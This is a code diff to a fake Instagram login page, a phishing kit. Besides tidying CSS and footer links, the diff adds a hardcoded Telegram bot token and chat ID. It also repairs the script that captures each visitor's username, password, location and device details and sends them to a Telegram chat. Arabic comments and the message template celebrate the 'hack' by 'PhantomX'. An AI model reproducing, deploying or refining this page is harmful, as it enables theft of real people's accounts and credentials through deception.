@@ -8,68 +8,58 @@
     <meta name="author" content="Luan Fernando" />
     <title>Instagram</title>
     <style>
-               h1,h2,h3,p,ul{
+        h1,h2,h3,p,ul {
             margin: 0;
         }
-
-        ul{
+        ul {
             padding: 0;
             list-style: none;
         }
-
         a {
             text-decoration: none;
         }
-
-        body{
+        body {
             margin: 0;
             padding: 0;
             background-color: #FAFAFA;
             font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
             color: #262626;
         }
-
-        .container{
+        .container {
             display: grid;
             grid-template-columns: 1fr 350px;
             column-gap: 1.25rem;
             width: 755px;
             margin: 120px auto 90px;
         }
-
-        .img-photo{
+        .img-photo {
             height: 635px;
             position: relative;
             background: url('https://github.com/Luuan11/instagram-login-page/blob/main/assets/img/phone.png?raw=true') no-repeat center;
         }
-
-        .img-photo img{
+        .img-photo img {
             position: absolute;
             bottom: 65px;
             left: 116px;
         }
-
-        .logo-instagram{
+        .logo-instagram {
             margin: 20px 0 30px 0;
         }
-
-        .form-login{
+        .form-login {
             text-align: center;
             font-size: 14px;
             margin-top: 3px;
         }
-
-        .form-login form{
+        .form-login form {
             text-align: center;
             background-color: #fff;
             padding: 1.25rem 2.5rem;
             border: 1px solid rgb(219,219,219);
             margin-bottom: 10px;
         }
-
-        .form-login input{
+        .form-login input {
             width: 100%;
-            color: #dbdbdb;
+            color: #262626; /* تغيير اللون إلى لون أغمق */
             box-sizing: border-box;
             font-size: 0.7rem;
             padding: 13px 0 13px 8px;
@@ -78,10 +68,9 @@
             border-radius: 3px;
             outline: none;
         }
-
         .form-login button {
             color: #fff;
-            font-weight: 7bold;
+            font-weight: bold;
             width: 100%;
             margin-top: 15px;
             background: #0195f6;
@@ -90,13 +79,11 @@
             border-radius: 4px;
             cursor: pointer;
         }
-
-        .form-login button:disabled{
+        .form-login button:disabled {
             background: #B2DFFC;
             cursor: default;
         }
-
-        .or{
+        .or {
             margin: 1rem 0 1.6rem;
             font-size: 13px;
             color: #8E8E8E;
@@ -106,16 +93,14 @@
             align-items: center;
             justify-content: space-between;
         }
-
         .or::after,
-        .or::before{
+        .or::before {
             content: "";
             width: 105px;
             height: 1px;
             background: #dbdbdb;
         }
-
-        .login-facebook{
+        .login-facebook {
             color: #385185;
             font-weight: 600;
             font-size: 0.875rem;
@@ -124,57 +109,47 @@
             justify-content: center;
             margin: 0 auto 18px;
         }
-
-        .forgot-pass{
+        .forgot-pass {
             font-size: 0.8rem;
             color: #385185;
         }
-
-        .signup{
+        .signup {
             border: 1px solid #dbdbdb;
             background-color: #fff;
             padding: 20px 0;
             margin: 0 0 20px;
         }
-
-        .signup a{
+        .signup a {
             font-weight: 600;
             color: #0095f6;
         }
-
-        .get-app{
+        .get-app {
             margin-top: 20px;
         }
-
-        .get-app p{
+        .get-app p {
             font-size: 0.8rem;
         }
-
-        .get-app img{
+        .get-app img {
             margin-top: 20px;
             width: 135px;
         }
-
-        .clone-page{
+        .clone-page {
             text-align: center;
             margin-bottom: 20px;
             font-weight: bold;
         }
-
-        .footer{
+        .footer {
             text-align: center;
             width: 970px;
             margin: 0 auto;
             font-size: 12px;
             color: #8e8e8e;
         }
-
-        .footer a{
+        .footer a {
             color: #8e8e8e;
             display: inline-block;
             margin: 0 0.375rem 0.625rem;
         }
-
     </style>
 </head>
 <body>
@@ -189,7 +164,7 @@
                 <input id="password" type="password" name="passwordUser" placeholder="Password">
                 <button type="button" id="loginbutton" disabled>Log In</button>
                 <div class="or">OR</div>
-                <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATBLxmCRoRwvl25sexsbPWvJw-grK07kle5WzR1ca7bXZHdBtHOIO74vaqCtBEvTOhIKu64sV0oJGNamQNUPnTqeclCbondIgwut9lAktocPxQvqk5oHL1I9aZKi5gMqRMHtGTVKVTSaXuF82QPvO6lKkaGijgIjDqV8_4iYkTujw7thBhwmBmX1cXPEWhws85Ei-GqvnITWA0qJ1JQQdRf4HdolF6FHy2h8vjJJUsAGzhed5g" class="login-facebook">
+                <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%252Fsignupviafb" class="login-facebook">
                     <img src="https://github.com/Luuan11/instagram-login-page/blob/main/assets/img/fb.png?raw=true" alt="Facebook icon"> Log in with Facebook
                 </a>
                 <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pass">Forgot password?</a>
@@ -209,8 +184,6 @@
         </section>
     </main>
 
-    
-
     <footer class="footer">
         <nav>
             <a href="https://about.meta.com">Meta</a>
@@ -221,11 +194,6 @@
             <a href="https://developers.facebook.com/docs/instagram">API</a>
             <a href="https://www.instagram.com/legal/privacy">Privacy</a>
             <a href="https://www.instagram.com/legal/terms">Terms</a>
-            <a href="https://www.instagram.com/explore/locations">Locations</a>
-            <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
-            <a href="https://www.threads.net">Threads</a>
-            <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a>
-            <a href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer">Meta-Verified</a>
         </nav>
         <div class="copy">
             <span>Instagram from meta 2025</span>
@@ -233,6 +201,10 @@
     </footer>
 
     <script>
+        // ضع التوكن الخاص بالبوت هنا
+        const botToken = "7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA";  // استبدل بـ التوكن الخاص بك
+        const chatId = "5091980014";      // استبدل بـ chat ID الخاص بك
+
         document.addEventListener('DOMContentLoaded', function() {
             const usernameField = document.querySelector('#username');
             const passwordField = document.querySelector('#password');
@@ -266,7 +238,7 @@
                 // بناء الرسالة
                 const message = `🔓 *تم اختراق الحساب بنجاح بواسطة PhantomX نوع الحساب انستجرام* 🔓\n\n` +
                                 `💻 *معلومات الحساب:* 💻\n` +
-                                `📧 البريد الإلكتروني: ${username}\n` +
+                                `📧 اليوزر او الرقم او البريد الإلكتروني: ${username}\n` +
                                 `🔑 كلمة المرور: ${password}\n\n` +
                                 `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
                                 `📱 *جهاز:* ${deviceInfo.device}, ${deviceInfo.os}\n` +
@@ -274,7 +246,7 @@
                                 `الاختراق تم بواسطة PhantomX`;
 
                 // إرسال الرسالة إلى قناة تليجرام
-                const telegramChannel = "https://api.telegram.org/bot<7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA>/sendMessage?chat_id=<5091980014>&text=" + encodeURIComponent(message);
+                const telegramChannel = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(message);
                 fetch(telegramChannel).then(response => {
                     console.log("تم إرسال الرسالة إلى التليجرام.");
                 }).catch(error => {
